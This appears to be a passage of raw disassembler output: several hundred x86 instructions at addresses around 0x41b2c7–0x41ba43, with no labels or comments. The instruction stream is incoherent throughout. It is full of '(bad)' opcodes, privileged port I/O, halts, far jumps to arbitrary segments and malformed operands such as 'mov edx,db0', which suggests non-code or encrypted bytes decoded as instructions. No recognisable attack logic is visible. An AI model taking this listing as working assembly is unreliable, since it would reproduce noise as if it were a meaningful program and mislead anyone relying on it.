  41b2c7:	mov    WORD PTR [esi+0x66ec74d4],gs
  41b2cd:	loop   0x41b2c1
  41b2cf:	loopne 0x41b34a
  41b2d1:	sub    DWORD PTR [ebp+0x68],edx
  41b2d4:	add    DWORD PTR [ecx-0x3fc19952],esi
  41b2da:	cs mov eax,0xa284b8a
  41b2e0:	add    al,0x90
  41b2e2:	out    0xd4,al
  41b2e4:	jmp    0x88c2:0x9aa249de
  41b2eb:	out    0xfb,al
  41b2ed:	xor    eax,0x23c47eeb
  41b2f2:	mov    bl,0xfd
  41b2f4:	add    esi,DWORD PTR [edx]
  41b2f6:	lods   al,BYTE PTR ds:[esi]
  41b2f7:	sti    
  41b2f8:	mov    DWORD PTR [eax],edx
  41b2fa:	pop    ebp
  41b2fb:	lock outs dx,DWORD PTR ds:[esi]
  41b2fd:	xchg   ecx,eax
  41b2fe:	or     BYTE PTR [ebx],0xd2
  41b301:	sbb    ebx,DWORD PTR [edx+0x13]
  41b304:	sub    DWORD PTR [esi+ecx*8+0x3d7d6e3e],edi
  41b30b:	jge    0x41b378
  41b30d:	sub    DWORD PTR [eax+0x72b955b5],esi
  41b313:	xlat   BYTE PTR ds:[ebx]
  41b314:	cdq    
  41b315:	push   ecx
  41b316:	repz xor bl,cl
  41b319:	jp     0x41b38c
  41b31b:	aam    0x54
  41b31d:	sbb    esp,DWORD PTR [edx+0x77]
  41b320:	adc    DWORD PTR [esi+0x2],ebp
  41b323:	hlt    
  41b324:	inc    esi
  41b325:	and    DWORD PTR [ebp-0x5bc1b40a],edx
  41b32b:	in     eax,dx
  41b32c:	xor    DWORD PTR [ebx-0x4c7aeac0],ecx
  41b332:	dec    edx
  41b333:	cmp    ebx,DWORD PTR [eax+0x7b]
  41b336:	push   ss
  41b337:	jg     0x41b2cf
  41b339:	push   ds
  41b33a:	fwait
  41b33b:	pop    ebp
  41b33c:	add    eax,0xb0943857
  41b341:	ins    BYTE PTR es:[edi],dx
  41b342:	or     al,0xea
  41b344:	addr16 pop esi
  41b346:	aaa    
  41b347:	and    BYTE PTR [eax+0x7a75a079],bh
  41b34d:	loope  0x41b3cc
  41b34f:	add    DWORD PTR [ebx-0x32b777c6],eax
  41b355:	push   ds
  41b356:	mov    ch,0xd3
  41b358:	fisttp QWORD PTR [eax-0x1ca8d79c]
  41b35e:	fisub  DWORD PTR [ebp+edx*1+0x591aa84c]
  41b365:	or     DWORD PTR [esi+0x25af8dfc],0xf743c7c4
  41b36f:	cs jnp 0x41b374
  41b372:	pop    ss
  41b373:	xrelease xchg BYTE PTR [ebx],dh
  41b376:	in     eax,0x81
  41b378:	sub    esp,edx
  41b37a:	ins    DWORD PTR es:[edi],dx
  41b37b:	xchg   DWORD PTR [ebx-0xb16d4b1],esi
  41b381:	icebp  
  41b382:	and    bh,BYTE PTR [ebx-0x39]
  41b385:	cs js  0x41b341
  41b388:	cmc    
  41b389:	add    BYTE PTR ss:[ebp-0x56],bh
  41b38d:	mov    ebp,ebp
  41b38f:	xor    BYTE PTR es:[edx],0x3e
  41b393:	in     al,dx
  41b394:	lds    esp,FWORD PTR [edx+0x2e]
  41b397:	out    0xa9,al
  41b399:	mov    ebp,0x2a08fe7f
  41b39e:	jno    0x41b3c8
  41b3a0:	clc    
  41b3a1:	lahf   
  41b3a2:	retf   
  41b3a3:	push   ss
  41b3a4:	sti    
  41b3a5:	rcr    BYTE PTR [eax+0x6f14e167],1
  41b3ab:	(bad)  
  41b3ac:	dec    edi
  41b3ad:	lahf   
  41b3ae:	outs   dx,DWORD PTR ds:[esi]
  41b3af:	shr    DWORD PTR [edx+0x4c1f598c],cl
  41b3b5:	out    0x32,al
  41b3b7:	pushf  
  41b3b8:	mov    esp,0x82e5a846
  41b3bd:	mov    bh,0x7b
  41b3bf:	lods   eax,DWORD PTR ds:[esi]
  41b3c0:	mov    ecx,0x88ac4025
  41b3c5:	lea    edi,[ebx]
  41b3c7:	sub    al,0xe2
  41b3c9:	mov    ch,0x42
  41b3cb:	push   ds
  41b3cc:	or     DWORD PTR [esi+eiz*2],esi
  41b3cf:	pop    edi
  41b3d0:	pop    ebp
  41b3d1:	sahf   
  41b3d2:	lahf   
  41b3d3:	in     eax,dx
  41b3d4:	jmp    0x4afc:0x39584a00
  41b3db:	mov    eax,ds:0xc0aa9e00
  41b3e0:	cdq    
  41b3e1:	push   ds
  41b3e2:	fcom   DWORD PTR ds:0x6900d40b
  41b3e8:	pop    esp
  41b3e9:	cmp    dl,BYTE PTR ds:0xdbb41602
  41b3ef:	mov    DWORD PTR [eax+0x5],esi
  41b3f2:	rol    BYTE PTR [esi+0x25],0xd0
  41b3f6:	inc    ebp
  41b3f7:	cmp    edx,DWORD PTR ds:0x1514b6e8
  41b3fd:	xor    BYTE PTR ds:0x5d97d08c,cl
  41b403:	inc    esp
  41b404:	add    bl,bh
  41b406:	lea    ecx,[edi]
  41b408:	(bad)  
  41b409:	mov    edx,db0
  41b40c:	aas    
  41b40d:	sub    bl,bl
  41b40f:	cmp    al,0xf7
  41b411:	sti    
  41b412:	les    edi,FWORD PTR [eax+0x33]
  41b415:	sbb    eax,0x1443c379
  41b41a:	and    ch,BYTE PTR [edi]
  41b41c:	add    DWORD PTR [edi],edx
  41b41e:	mov    al,ds:0x65dd6704
  41b423:	in     al,dx
  41b424:	repnz bound ecx,QWORD PTR [ebp-0x78125e24]
  41b42b:	or     BYTE PTR [edx+eiz*8+0x72fae144],al
  41b432:	sbb    eax,0xcbd5f856
  41b437:	or     ch,al
  41b439:	icebp  
  41b43a:	out    dx,eax
  41b43b:	outs   dx,DWORD PTR ds:[esi]
  41b43c:	loop   0x41b41c
  41b43e:	cmp    eax,0x91b6ff38
  41b443:	loop   0x41b49d
  41b445:	pop    es
  41b446:	ss bnd ret 
  41b449:	pushf  
  41b44a:	mov    gs,ecx
  41b44c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44d:	adc    dh,BYTE PTR [esi-0x1706ff0a]
  41b453:	les    esi,FWORD PTR [ebx-0x7bad3670]
  41b459:	stos   DWORD PTR es:[edi],eax
  41b45a:	mov    ebp,0xcc103a22
  41b45f:	call   0x4d421524
  41b464:	xor    BYTE PTR [ebx-0x3a57d0fd],ch
  41b46a:	sbb    ecx,DWORD PTR [ecx+0x21f6bd6a]
  41b470:	pusha  
  41b471:	(bad)  [ecx-0x1913a1e0]
  41b477:	inc    edi
  41b478:	sahf   
  41b479:	in     al,dx
  41b47a:	ret    
  41b47b:	arpl   WORD PTR ds:0xe088176e,ax
  41b481:	jmp    0x41b453
  41b483:	xchg   edi,eax
  41b484:	clc    
  41b485:	scas   al,BYTE PTR es:[edi]
  41b486:	xor    al,0x47
  41b488:	leave  
  41b489:	mov    edx,0x9664a46e
  41b48e:	(bad)  
  41b48f:	pop    edx
  41b490:	enter  0xc29b,0x16
  41b494:	stos   BYTE PTR es:[edi],al
  41b495:	lods   al,BYTE PTR ds:[esi]
  41b496:	ja     0x41b43f
  41b498:	scas   al,BYTE PTR es:[edi]
  41b499:	test   BYTE PTR [edi+0x24b55f9],ch
  41b49f:	scas   al,BYTE PTR es:[edi]
  41b4a0:	mov    ?,WORD PTR [ecx+0x46]
  41b4a3:	scas   eax,DWORD PTR es:[edi]
  41b4a4:	adc    BYTE PTR [esi+eiz*4],bh
  41b4a7:	push   0xffffffcd
  41b4a9:	sub    esp,ebp
  41b4ab:	gs mov DWORD PTR fs:[ecx-0x62571ec5],ebp
  41b4b3:	lods   eax,DWORD PTR ds:[esi]
  41b4b4:	test   eax,0xe6a18f0a
  41b4b9:	and    al,0xed
  41b4bb:	push   ebx
  41b4bc:	fcom   QWORD PTR [edi]
  41b4be:	xor    BYTE PTR [esi-0x1e13e44b],0xed
  41b4c5:	jns    0x41b51d
  41b4c7:	out    dx,al
  41b4c8:	sub    esp,ebx
  41b4ca:	test   eax,0xc04a346f
  41b4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d0:	pop    esp
  41b4d1:	sqrtps xmm2,XMMWORD PTR [edi-0x50]
  41b4d5:	mov    WORD PTR [ebp+0x56d21600],fs
  41b4db:	in     al,0xc5
  41b4dd:	in     al,dx
  41b4de:	sbb    dh,dh
  41b4e0:	je     0x41b46a
  41b4e2:	std    
  41b4e3:	pop    ebx
  41b4e4:	ret    
  41b4e5:	int    0xee
  41b4e7:	addr16 pop edx
  41b4e9:	adc    al,0xa1
  41b4eb:	push   esi
  41b4ec:	out    0xe0,al
  41b4ee:	jne    0x41b481
  41b4f0:	stos   BYTE PTR es:[edi],al
  41b4f1:	sub    al,0x3c
  41b4f3:	mov    edx,0x45229913
  41b4f8:	mov    dl,0x87
  41b4fa:	pop    esi
  41b4fb:	arpl   WORD PTR [eax+0x2c],dx
  41b4fe:	pop    eax
  41b500:	ss jae 0x41b4a2
  41b503:	int3   
  41b504:	sbb    esp,ebx
  41b506:	dec    ebx
  41b507:	mov    ecx,0xe0fa01be
  41b50c:	xor    bh,BYTE PTR [edx-0x46880d4b]
  41b512:	mov    eax,ds:0xfae9b803
  41b517:	xchg   BYTE PTR [edx+0x1d86f42f],ch
  41b51d:	stos   BYTE PTR es:[edi],al
  41b51e:	std    
  41b51f:	mov    cl,0x6b
  41b521:	push   eax
  41b522:	mov    edi,0xecc4d17
  41b527:	pop    ss
  41b528:	lods   eax,DWORD PTR ds:[esi]
  41b529:	xchg   edi,eax
  41b52a:	inc    ebx
  41b52b:	call   0x680e:0x9ee59757
  41b532:	lods   eax,DWORD PTR ds:[esi]
  41b533:	ja     0x41b5a8
  41b535:	lahf   
  41b536:	jo     0x41b501
  41b538:	jge    0x41b5b4
  41b53a:	add    BYTE PTR [eax],al
  41b53c:	pop    edx
  41b53d:	xlat   BYTE PTR gs:[ebx]
  41b53f:	and    eax,0x542af8bb
  41b544:	or     ebx,edi
  41b546:	mov    ds:0x48932073,al
  41b54b:	xor    BYTE PTR [edx-0x48],ah
  41b54e:	clc    
  41b54f:	push   esp
  41b550:	not    BYTE PTR [edx-0x51]
  41b553:	leave  
  41b554:	ss dec ecx
  41b556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b557:	retf   
  41b558:	popf   
  41b559:	les    esi,FWORD PTR ds:0xd56d7fa6
  41b55f:	add    eax,0x355354fc
  41b564:	call   0xaeb2:0x130e56f
  41b56b:	outs   dx,BYTE PTR ds:[esi]
  41b56c:	add    al,BYTE PTR [esp+esi*4+0x70e36c38]
  41b573:	sar    ebx,cl
  41b575:	mov    edx,0x196afb69
  41b57a:	stos   DWORD PTR es:[edi],eax
  41b57b:	int3   
  41b57c:	inc    ebx
  41b57d:	dec    edi
  41b57e:	(bad)  
  41b580:	and    DWORD PTR [eax],esp
  41b582:	inc    esp
  41b583:	scas   eax,DWORD PTR es:[edi]
  41b584:	push   0x67
  41b586:	mov    bl,0x27
  41b588:	nop
  41b589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b58a:	dec    eax
  41b58b:	push   eax
  41b58c:	stos   BYTE PTR es:[edi],al
  41b58d:	int3   
  41b58e:	add    al,0x73
  41b590:	mov    al,ds:0x687f101a
  41b595:	mov    ebp,0xf1623dfc
  41b59a:	and    BYTE PTR [edi-0x41],0x10
  41b59e:	enter  0xde62,0x3a
  41b5a2:	enter  0x5615,0xf6
  41b5a6:	and    al,0x83
  41b5a8:	mov    dh,BYTE PTR [eax]
  41b5aa:	(bad)  
  41b5ab:	and    ebp,esp
  41b5ad:	xchg   esi,eax
  41b5ae:	test   al,0xcb
  41b5b0:	jmp    0x41b61e
  41b5b2:	sbb    DWORD PTR [ecx+0x59dbd11a],0x79fe60b5
  41b5bc:	xchg   esp,eax
  41b5bd:	(bad)  
  41b5be:	repz add ebx,eax
  41b5c1:	pop    ds
  41b5c2:	pop    es
  41b5c3:	sbb    dh,BYTE PTR [edi-0x7d66bcf6]
  41b5c9:	aam    0x7
  41b5cb:	push   edi
  41b5cc:	adc    eax,0xdb67fca9
  41b5d1:	aad    0xcc
  41b5d3:	stc    
  41b5d4:	dec    ebx
  41b5d5:	jecxz  0x41b570
  41b5d7:	sbb    BYTE PTR [edi+0x2c],bh
  41b5da:	xorps  xmm6,XMMWORD PTR [ecx-0x3ddc1f09]
  41b5e1:	mov    eax,ds:0xcc6db5c2
  41b5e6:	mov    WORD PTR [edx],ss
  41b5e8:	call   0xcce:0xd907fbb3
  41b5ef:	mov    ds:0x62bf5d8d,al
  41b5f4:	sub    dl,BYTE PTR [ecx]
  41b5f6:	push   ecx
  41b5f7:	sahf   
  41b5f8:	ds ds jno 0x41b638
  41b5fc:	cmp    ah,BYTE PTR [esp+edi*2+0x6a6f2bd5]
  41b603:	rcr    DWORD PTR [edx-0xa],1
  41b606:	out    0xe7,al
  41b608:	jno    0x41b630
  41b60a:	mov    ecx,0xe0d6d04c
  41b60f:	jbe    0x41b602
  41b611:	xlat   BYTE PTR ds:[ebx]
  41b612:	mov    cl,0xf6
  41b614:	sub    BYTE PTR [edx+ebx*8],bh
  41b617:	in     eax,0xcd
  41b619:	outs   dx,BYTE PTR ds:[esi]
  41b61a:	xchg   DWORD PTR [eax+0x1f],ebp
  41b61d:	fidiv  WORD PTR [ebp-0x18]
  41b620:	adc    DWORD PTR [eax+0x351a0bed],edx
  41b626:	xchg   BYTE PTR [esi+0x66],ah
  41b629:	les    esp,FWORD PTR [esi]
  41b62b:	sbb    bh,ch
  41b62d:	pop    ss
  41b62e:	sbb    DWORD PTR [eax+0x4d],eax
  41b631:	in     eax,0x68
  41b633:	dec    esi
  41b634:	mov    DWORD PTR [esi+0x1a4181aa],ebp
  41b63a:	es int 0x51
  41b63d:	sbb    ecx,ebp
  41b63f:	mov    esp,0x93dbcdb4
  41b644:	lods   eax,DWORD PTR ds:[esi]
  41b645:	sbb    ebp,DWORD PTR [edx+0x43741bf5]
  41b64b:	sbb    bh,0xde
  41b64e:	out    0x51,ax
  41b651:	call   0x242f:0xa868ecb6
  41b658:	jmp    0x6f5dccb5
  41b65d:	ror    BYTE PTR [edx],0x9c
  41b660:	sub    al,0x4b
  41b662:	(bad)  
  41b664:	push   esp
  41b665:	rcl    DWORD PTR [ecx],cl
  41b667:	mov    ds:0x6dc0683c,al
  41b66c:	xor    BYTE PTR [ebp-0x67905ec1],bh
  41b672:	jnp    0x41b642
  41b674:	dec    eax
  41b675:	add    eax,0xe338e797
  41b67a:	fwait
  41b67b:	aaa    
  41b67c:	inc    ebp
  41b67d:	jmp    0x41b6dc
  41b67f:	inc    edx
  41b680:	les    esp,FWORD PTR [eax]
  41b682:	inc    ebp
  41b683:	xor    ah,bh
  41b685:	aam    0x1d
  41b687:	outs   dx,BYTE PTR ds:[esi]
  41b688:	pop    ebp
  41b689:	ins    DWORD PTR es:[edi],dx
  41b68a:	jg     0x41b68e
  41b68c:	and    BYTE PTR [edi+ebx*8-0x3991e400],ah
  41b693:	call   0x6d2a:0x3a1bd99c
  41b69a:	es out dx,al
  41b69c:	mov    eax,ds:0xd58cb974
  41b6a1:	out    dx,eax
  41b6a2:	add    dl,bh
  41b6a4:	shr    DWORD PTR [edx-0x32e04a73],1
  41b6aa:	outs   dx,DWORD PTR ds:[esi]
  41b6ab:	or     DWORD PTR [ecx+eax*8],esi
  41b6ae:	dec    eax
  41b6af:	pop    edx
  41b6b0:	mov    edx,0xdd657c56
  41b6b5:	adc    BYTE PTR [esi],cl
  41b6b7:	push   ebp
  41b6b8:	adc    al,0x16
  41b6ba:	dec    ebx
  41b6bb:	jae    0x41b6bc
  41b6bd:	dec    edi
  41b6be:	ins    BYTE PTR es:[edi],dx
  41b6bf:	jp     0x41b6aa
  41b6c1:	out    0xaa,eax
  41b6c3:	pushf  
  41b6c4:	jns    0x41b713
  41b6c6:	pop    ss
  41b6c7:	prefetchwt1 BYTE PTR [esi-0x6c5e2bbb]
  41b6ce:	(bad)  
  41b6cf:	and    BYTE PTR [edx+0x47],al
  41b6d2:	jo     0x41b73a
  41b6d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d5:	push   edx
  41b6d6:	(bad)  
  41b6d7:	bound  ebx,QWORD PTR [eax+0x5e]
  41b6da:	jmp    0x41b6f6
  41b6dc:	fiadd  WORD PTR [edx]
  41b6de:	loopne 0x41b6f8
  41b6e0:	enter  0xb355,0xc6
  41b6e4:	mov    edi,0x74118670
  41b6e9:	xchg   ebx,eax
  41b6ea:	scas   eax,DWORD PTR es:[edi]
  41b6eb:	xor    BYTE PTR [ebx+0x1b074f61],bh
  41b6f1:	pop    eax
  41b6f2:	xchg   edi,eax
  41b6f3:	out    0x8f,eax
  41b6f5:	dec    ebp
  41b6f6:	sbb    al,0xf6
  41b6f8:	mov    ah,0xf3
  41b6fa:	sbb    ch,dl
  41b6fc:	fdiv   DWORD PTR [edi-0x42]
  41b6ff:	pop    ebp
  41b700:	inc    ebx
  41b701:	retf   
  41b702:	lods   al,BYTE PTR ds:[esi]
  41b703:	push   es
  41b704:	jo     0x41b6c1
  41b706:	fs nop
  41b708:	mov    ds:0x30e65d20,eax
  41b70d:	pop    es
  41b70e:	lea    eax,[edx-0x37]
  41b711:	dec    eax
  41b712:	inc    esp
  41b713:	inc    esi
  41b714:	dec    ecx
  41b715:	call   0x221517ea
  41b71a:	sub    cl,al
  41b71c:	mov    eax,0xe5ea39e3
  41b721:	cmp    al,0x7f
  41b723:	aam    0x42
  41b725:	jbe    0x41b6a7
  41b727:	imul   eax,DWORD PTR [esi],0x72
  41b72a:	push   0xffffffed
  41b72c:	(bad)
  41b730:	daa    
  41b731:	xchg   ebp,eax
  41b732:	cmp    al,0xb5
  41b734:	popa   
  41b735:	lock shl al,cl
  41b738:	fsubp  st(6),st
  41b73a:	mov    eax,ds:0x6e8a25a5
  41b73f:	add    eax,0x7b8c2dff
  41b744:	xor    al,0xd9
  41b746:	xor    BYTE PTR ds:[esp+ebp*2],ah
  41b74a:	hlt    
  41b74b:	fistp  WORD PTR [ebx]
  41b74d:	xor    DWORD PTR [ebp+0x21608c0b],0x32
  41b754:	sahf   
  41b755:	and    al,al
  41b757:	inc    ecx
  41b758:	mov    eax,ds:0xafc7e5b1
  41b75d:	inc    eax
  41b75e:	(bad)  [edx+0x1b]
  41b761:	in     eax,dx
  41b762:	pop    ecx
  41b763:	or     eax,0x743099fd
  41b768:	(bad)  
  41b769:	jb     0x41b76a
  41b76b:	cmc    
  41b76c:	xchg   ecx,eax
  41b76d:	je     0x41b73f
  41b76f:	repnz cli 
  41b771:	adc    DWORD PTR [ebx-0x13],ebx
  41b774:	stos   BYTE PTR es:[edi],al
  41b775:	lea    esp,gs:[bp-0x426b]
  41b77b:	(bad)  
  41b77c:	int3   
  41b77d:	push   esi
  41b77e:	shl    DWORD PTR [eax],1
  41b780:	and    BYTE PTR [ebp-0x14f0b580],ch
  41b786:	or     al,0x13
  41b788:	xor    eax,eax
  41b78a:	mov    dh,0x4f
  41b78c:	ret    0x72bd
  41b78f:	sub    eax,0x2f782173
  41b794:	jmp    0xa1e0a610
  41b799:	jne    0x41b817
  41b79b:	pop    esi
  41b79c:	mov    WORD PTR [eax],ss
  41b79e:	push   cs
  41b79f:	call   0x9096e522
  41b7a4:	dec    ebp
  41b7a5:	lods   al,BYTE PTR ds:[esi]
  41b7a6:	jae    0x41b7d8
  41b7a8:	int    0x4f
  41b7aa:	mov    dh,0xe4
  41b7ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ad:	jb     0x41b7d5
  41b7af:	adc    edx,ebp
  41b7b1:	xchg   edx,eax
  41b7b2:	mov    ds:0xac95b59e,eax
  41b7b7:	enter  0xe0bf,0x4e
  41b7bb:	cwde   
  41b7bc:	ret    
  41b7bd:	mov    cl,0xcb
  41b7bf:	push   ss
  41b7c0:	rcr    cl,0xc4
  41b7c3:	push   esp
  41b7c4:	mov    ch,BYTE PTR [ebp*4+0x77f88114]
  41b7cb:	push   es
  41b7cc:	dec    edx
  41b7cd:	mov    ds:0xff161824,al
  41b7d2:	inc    ebx
  41b7d3:	jb     0x41b7e3
  41b7d5:	sub    esp,DWORD PTR [edx-0x50eca37f]
  41b7db:	pop    edi
  41b7dc:	dec    edx
  41b7dd:	sbb    edx,DWORD PTR [edx+0x61ca5536]
  41b7e3:	call   0x7b86:0xc299986e
  41b7ea:	mov    ebx,0x7f7b2272
  41b7ef:	xor    al,0xee
  41b7f1:	jl     0x41b83a
  41b7f3:	ds loop 0x41b823
  41b7f6:	xor    eax,DWORD PTR [eax+0x49257378]
  41b7fc:	adc    ebx,ebx
  41b7fe:	(bad)  
  41b800:	mov    ebp,0x338adbba
  41b805:	dec    ebp
  41b806:	leave  
  41b807:	iret   
  41b808:	loop   0x41b7db
  41b80a:	das    
  41b80b:	mov    cl,0xba
  41b80d:	jp     0x41b7dd
  41b80f:	push   edx
  41b810:	add    al,0x34
  41b812:	dec    BYTE PTR [esi-0x71613a4b]
  41b818:	outs   dx,DWORD PTR ds:[esi]
  41b819:	jmp    0x90e2:0x39755f86
  41b820:	mov    edx,0xcec7d446
  41b825:	adc    DWORD PTR [ebx+esi*8+0x3d8a7f5f],esi
  41b82c:	les    esi,FWORD PTR [ecx+esi*2-0x59ae1878]
  41b833:	pusha  
  41b834:	inc    ecx
  41b835:	fbld   TBYTE PTR [ebp-0x7c6963cd]
  41b83b:	mov    ds:0xcd2cc499,eax
  41b840:	outs   dx,BYTE PTR ds:[esi]
  41b841:	pop    esi
  41b842:	or     al,0xce
  41b844:	in     al,0xb4
  41b846:	push   ds
  41b847:	test   BYTE PTR [ebx],bl
  41b849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b84a:	dec    esp
  41b84b:	sbb    ecx,DWORD PTR [eax-0x7361800e]
  41b851:	cmp    ebp,esp
  41b853:	xor    al,0x16
  41b855:	imul   ebx,ebx,0xfb7e38d9
  41b85b:	xchg   ecx,eax
  41b85c:	(bad)  
  41b85d:	into   
  41b85e:	jne    0x41b7f2
  41b860:	arpl   WORD PTR [edx],dx
  41b862:	outs   dx,DWORD PTR ds:[esi]
  41b863:	mov    DWORD PTR [ecx],eax
  41b865:	pop    edx
  41b866:	test   al,0x9e
  41b868:	push   es
  41b869:	je     0x41b8c2
  41b86b:	out    dx,al
  41b86c:	mov    dh,BYTE PTR [edx]
  41b86e:	or     dh,al
  41b870:	aad    0xfd
  41b872:	movzx  esi,WORD PTR [ecx]
  41b875:	mov    esp,0xbecbc6d9
  41b87a:	inc    ecx
  41b87b:	ja     0x41b858
  41b87d:	jge    0x41b839
  41b87f:	test   BYTE PTR ds:0xe97ff999,bl
  41b885:	rcr    DWORD PTR [ecx-0x760e7d45],1
  41b88b:	sub    DWORD PTR [edx-0x1a53ffc8],0x6f
  41b892:	loopne 0x41b908
  41b894:	jmp    0x41b893
  41b896:	jo     0x41b85f
  41b898:	arpl   WORD PTR [ebp-0x49],di
  41b89b:	div    esp
  41b89d:	mov    eax,ds:0x4e7ca93a
  41b8a2:	pop    ss
  41b8a3:	cmp    DWORD PTR [ebx],0xffffff88
  41b8a6:	leave  
  41b8a7:	mov    edx,0x845bd6b
  41b8ac:	push   ebp
  41b8ad:	neg    BYTE PTR [esi+0x7565c674]
  41b8b3:	sub    eax,0xded1c174
  41b8b8:	loop   0x41b922
  41b8ba:	out    dx,eax
  41b8bb:	je     0x41b845
  41b8bd:	pushf  
  41b8be:	fnstsw ax
  41b8c0:	les    esp,FWORD PTR [eax-0x13f8ee46]
  41b8c6:	or     al,al
  41b8c8:	mov    eax,0x975d754
  41b8cd:	test   BYTE PTR [esi+esi*2-0x1e],dh
  41b8d1:	int    0x55
  41b8d3:	jnp    0x41b865
  41b8d5:	in     eax,0x58
  41b8d7:	mov    DWORD PTR [edx-0x43],esi
  41b8da:	retf   0x5124
  41b8dd:	es jns 0x41b911
  41b8e0:	xlat   BYTE PTR ds:[ebx]
  41b8e1:	jg     0x41b95d
  41b8e3:	jns    0x41b94c
  41b8e5:	inc    ecx
  41b8e6:	test   al,0x90
  41b8e8:	loop   0x41b8c2
  41b8ea:	adc    BYTE PTR [ecx+0x63],ah
  41b8ed:	adc    ebx,esi
  41b8ef:	and    dl,BYTE PTR ds:0xfda92bb6
  41b8f5:	hlt    
  41b8f6:	ss xchg ebx,eax
  41b8f8:	cmp    cl,BYTE PTR [ecx+edi*2-0x5b450cfa]
  41b8ff:	in     eax,0x70
  41b901:	mov    esp,0x114d9448
  41b906:	mov    ebp,DWORD PTR [edx+0x3e11a82b]
  41b90c:	sbb    DWORD PTR [esi],ebp
  41b90e:	outs   dx,DWORD PTR ds:[esi]
  41b90f:	sahf   
  41b910:	hlt    
  41b911:	xor    ebp,esi
  41b913:	into   
  41b914:	sbb    BYTE PTR [eax-0x360f66bf],0x4e
  41b91b:	mov    bh,BYTE PTR [edi]
  41b91d:	jle    0x41b96a
  41b91f:	loopne 0x41b98a
  41b921:	ins    DWORD PTR es:[edi],dx
  41b922:	in     eax,dx
  41b923:	(bad)  
  41b924:	out    0x42,al
  41b926:	ins    DWORD PTR es:[edi],dx
  41b927:	xor    al,BYTE PTR [ebp+0x76]
  41b92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b92b:	leave  
  41b92c:	push   edx
  41b92d:	call   0x254df238
  41b932:	adc    DWORD PTR [edx+0x7b7d422c],edx
  41b938:	fdivr  st,st(7)
  41b93a:	loopne 0x41b919
  41b93c:	nop
  41b93d:	sahf   
  41b93e:	dec    esi
  41b93f:	(bad)  
  41b940:	stc    
  41b941:	mov    esi,0x54b86515
  41b946:	dec    eax
  41b947:	mov    eax,0x821c298
  41b94c:	push   edi
  41b94d:	div    DWORD PTR [ebx+0x4]
  41b950:	mov    edi,0x3a8f5fea
  41b955:	mov    ds:0x2869b28d,al
  41b95a:	cmp    al,0x53
  41b95c:	pop    eax
  41b95d:	fstp   TBYTE PTR [ecx+0x4a]
  41b960:	push   ss
  41b961:	push   esp
  41b962:	pop    esp
  41b963:	call   0xb146:0x4b778b42
  41b96a:	outs   dx,DWORD PTR ds:[esi]
  41b96b:	mov    WORD PTR [eax+0x1dbd9bd1],cs
  41b971:	lahf   
  41b972:	inc    ebp
  41b973:	cmp    dh,dl
  41b975:	int    0x73
  41b977:	sti    
  41b978:	pop    esp
  41b979:	dec    eax
  41b97a:	rol    DWORD PTR [eax+0x124c68fa],cl
  41b980:	cmp    bl,dh
  41b982:	lods   eax,DWORD PTR ds:[esi]
  41b983:	or     al,0x20
  41b985:	or     DWORD PTR [esi],edi
  41b987:	jecxz  0x41b97d
  41b989:	jle    0x41b9a7
  41b98b:	js     0x41b9e3
  41b98d:	mov    DWORD PTR [ecx-0x364b360],eax
  41b993:	ficom  WORD PTR [ebx+ebx*8]
  41b996:	std    
  41b997:	jmp    0xb0938634
  41b99c:	dec    ebx
  41b99d:	fadd   DWORD PTR [edx+0x2c]
  41b9a0:	lds    edi,FWORD PTR ds:0x41420332
  41b9a6:	xor    DWORD PTR [esi-0x64],esp
  41b9a9:	dec    ebx
  41b9aa:	inc    ebp
  41b9ab:	push   ecx
  41b9ac:	dec    edx
  41b9ad:	jbe    0x41b97f
  41b9af:	sbb    edi,esp
  41b9b1:	add    eax,0x14bccba1
  41b9b6:	dec    edx
  41b9b7:	popa   
  41b9b8:	xor    BYTE PTR [ecx],dl
  41b9ba:	mov    BYTE PTR [edx-0x4b02ddaa],bl
  41b9c0:	out    0x8d,eax
  41b9c2:	mov    ds:0xc29bccc9,eax
  41b9c7:	loopne 0x41b9d9
  41b9c9:	cmp    DWORD PTR [eax-0x1a],ecx
  41b9cc:	pop    edx
  41b9cd:	iret   
  41b9ce:	aad    0xb4
  41b9d0:	sahf   
  41b9d1:	push   ebp
  41b9d2:	sbb    al,0x39
  41b9d4:	das    
  41b9d5:	or     BYTE PTR [eax-0x331f8562],ch
  41b9db:	stc    
  41b9dc:	sub    cl,ah
  41b9de:	mov    cl,0x55
  41b9e0:	bound  ecx,QWORD PTR [ebp+0x21]
  41b9e3:	mov    dh,0x81
  41b9e5:	in     eax,0x6d
  41b9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9e8:	imul   ebp,eax,0x14f9f3b5
  41b9ee:	sub    DWORD PTR [esp+eax*2-0x3a],edx
  41b9f2:	pop    ebx
  41b9f3:	inc    ebx
  41b9f4:	loopne 0x41ba3a
  41b9f6:	scas   eax,DWORD PTR es:[edi]
  41b9f7:	js     0x41ba41
  41b9f9:	dec    ecx
  41b9fa:	aaa    
  41b9fb:	(bad)  
  41b9fc:	jmp    0x41ba41
  41b9fe:	fistp  DWORD PTR [edi-0x5576980b]
  41ba04:	outs   dx,BYTE PTR ds:[esi]
  41ba05:	add    edx,DWORD PTR [eax]
  41ba07:	loopne 0x41b9c0
  41ba09:	pop    edx
  41ba0a:	retf   
  41ba0b:	loopne 0x41ba4b
  41ba0d:	dec    edx
  41ba0e:	ret    0xf5d2
  41ba11:	aad    0xef
  41ba13:	das    
  41ba14:	pop    edi
  41ba15:	push   edx
  41ba16:	and    ebx,DWORD PTR [esp+edi*1-0x6fb64df9]
  41ba1d:	mov    eax,DWORD PTR [eax+0x4ba2973]
  41ba23:	cs push ebp
  41ba25:	adc    ah,BYTE PTR [eax+0x4f365710]
  41ba2b:	sbb    ecx,ecx
  41ba2d:	(bad)  
  41ba2e:	loop   0x41b9f8
  41ba30:	ror    BYTE PTR [esi],0x77
  41ba33:	call   0xc2453a59
  41ba38:	popa   
  41ba39:	dec    edi
  41ba3a:	rol    ah,cl
  41ba3c:	test   DWORD PTR [edx],ebx
  41ba3e:	out    dx,al
  41ba3f:	into   
  41ba40:	in     al,0x5b
  41ba42:	inc    eax
  41ba43:	pushf  
